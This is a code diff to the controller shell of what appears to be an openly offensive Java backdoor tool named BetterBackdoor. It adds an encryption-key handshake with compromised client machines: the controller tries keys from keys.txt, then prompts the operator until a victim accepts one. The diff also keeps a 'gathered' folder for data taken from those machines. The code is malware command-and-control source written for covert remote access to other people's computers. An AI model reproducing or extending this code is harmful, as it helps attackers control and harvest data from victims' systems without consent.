@@ -1,6 +1,7 @@
 package dev.thatcherclough.betterbackdoor.shell;
 
 import dev.thatcherclough.betterbackdoor.BetterBackdoor;
+import dev.thatcherclough.betterbackdoor.backend.Utils;
 
 import java.io.File;
 import java.io.ObjectInputStream;
@@ -8,10 +9,12 @@ import java.io.ObjectOutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Scanner;
 
 public class Shell {
 
 	private static Socket socket;
+	public static String key;
 	public static ObjectInputStream in;
 	public static ObjectOutputStream out;
 	public static ArrayList<Socket> connectedMachines = new ArrayList<>();
@@ -37,9 +40,10 @@ public class Shell {
 					System.out.println("No clients found. Searching again...\n");
 			}
 
-			if (connectedMachines.size() == 1)
+			if (connectedMachines.size() == 1) {
+				System.out.println("Found client.");
 				socket = connectedMachines.get(0);
-			else {
+			} else {
 				System.out.println("Select client to connect to:");
 				StringBuilder opString = new StringBuilder("op");
 				for (int k = 0; k < connectedMachines.size(); k++) {
@@ -57,6 +61,48 @@ public class Shell {
 
 			out = new ObjectOutputStream(socket.getOutputStream());
 			in = new ObjectInputStream(socket.getInputStream());
+
+			String isEncryptedString = (String) in.readObject();
+			if (isEncryptedString.equals("true")) {
+				Scanner keysIn = new Scanner(new File("keys.txt"));
+				while (keysIn.hasNextLine()) {
+					String possibleKey = keysIn.nextLine();
+					try {
+						String trueEncrypted = Utils.encrypt("true", possibleKey);
+						out.writeObject(trueEncrypted);
+						out.flush();
+						String response = (String) in.readObject();
+
+						if (response.equals("true")) {
+							key = possibleKey;
+							break;
+						}
+					} catch (Exception ignored) {
+					}
+				}
+
+				if (key == null)
+					System.out.println("Could not automatically find encryption key.");
+				while (key == null) {
+					System.out.println("Enter encryption key:");
+					String possibleKey = BetterBackdoor.getInput("");
+					try {
+						String trueEncrypted = Utils.encrypt("true", possibleKey);
+						out.writeObject(trueEncrypted);
+						out.flush();
+						String response = (String) in.readObject();
+
+						if (response.equals("true")) {
+							key = possibleKey;
+							break;
+						} else
+							throw new Exception();
+					} catch (Exception e) {
+						System.out.println("Incorrect key.");
+					}
+				}
+			}
+
 			new File("gathered").mkdir();
 			System.out.println("Connection has been established to " + socket.getInetAddress());
 			System.out.println("Enter 'help' for a list of available commands");
